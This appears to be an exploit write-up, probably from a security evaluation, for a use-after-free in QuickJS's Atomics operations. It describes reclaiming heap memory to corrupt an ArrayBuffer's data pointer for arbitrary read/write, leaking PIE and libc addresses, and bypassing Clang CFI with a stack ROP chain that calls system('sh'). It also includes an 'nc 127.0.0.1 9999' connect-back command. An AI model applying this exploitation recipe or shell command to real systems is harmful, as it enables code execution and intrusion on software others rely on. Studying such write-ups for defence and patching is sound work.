# exec-shell-cfi exploit (QuickJS strict CFI + Full RELRO)

## Vulnerability
QuickJS `js_atomics_op()` (and `js_atomics_store()`) captures a raw element pointer (`ptr`) via `js_atomics_get_ptr()`, then converts the user-supplied value argument with `JS_ToBigInt64()` / `JS_ToUint32()`. These conversions can invoke user JS (`valueOf()`), allowing us to resize a **Resizable ArrayBuffer** between pointer capture and the atomic operation.

After `valueOf()` returns, `js_atomics_op()` only checks `abuf->detached` and then performs the atomic operation using the **stale** `ptr`, giving a UAF/OOB primitive.

## Key exploitation idea
We make the backing-store chunk of a resizable ArrayBuffer be freed/moved by `resize()` inside `valueOf()`, then immediately allocate a new `ArrayBuffer()` whose **JSArrayBuffer struct** is placed in the freed chunk.

By choosing the original backing-store size carefully (`0x38` bytes), the freed chunk size fits `sizeof(JSArrayBuffer)` allocations (56 bytes) but cannot satisfy the `JSObject` allocation (72 bytes) that happens earlier in `new ArrayBuffer()`. This reliably makes the freed backing-store be reused for the **JSArrayBuffer** struct.

Then the stale atomic pointer targets an offset inside that struct:

- `JSArrayBuffer.data` is at offset `0x10`.
- Using a `BigInt64Array` and index `2` (2*8 = 0x10) lets `Atomics.exchange()` overwrite `data`.

This lets us create a corrupted `ArrayBuffer` whose backing pointer (`data`) is an arbitrary address, giving arbitrary read/write via `DataView`.

## Defeating ASLR
1. **Leak PIE base**: overwrite/read the victim `JSArrayBuffer.free_func` field (offset `0x30`, index `6`) to leak the address of `js_array_buffer_free`, then subtract the known static offset.
2. **Leak libc base**: with PIE known, read `realloc@GOT` to get the resolved libc address of `realloc`, subtract libc’s `realloc` offset.

No `/proc` access is used.

## CFI bypass and code execution
Clang CFI protects **indirect calls**, but not **returns** (backward edge). We therefore use a classic return-oriented approach:

- Leak a stack pointer via libc’s exported `environ`.
- Scan a small window below `envp` to find the saved return address of the `call eval_buf` site (the constant return address `pie_base + 0x3e27f`).
- Overwrite that saved RIP with a small libc ROP chain written directly onto the stack:

```
ret;                // alignment
pop rdi; ret;
&"sh\0";
system;
pop rdi; ret;
0;
exit;
```

This spawns `sh`, which reads stdin. The verifier pipes `nc 127.0.0.1 9999\n` into stdin; the shell executes it, connecting back to the listener.

## Files
- PoC: `/tmp/work/poc.js`

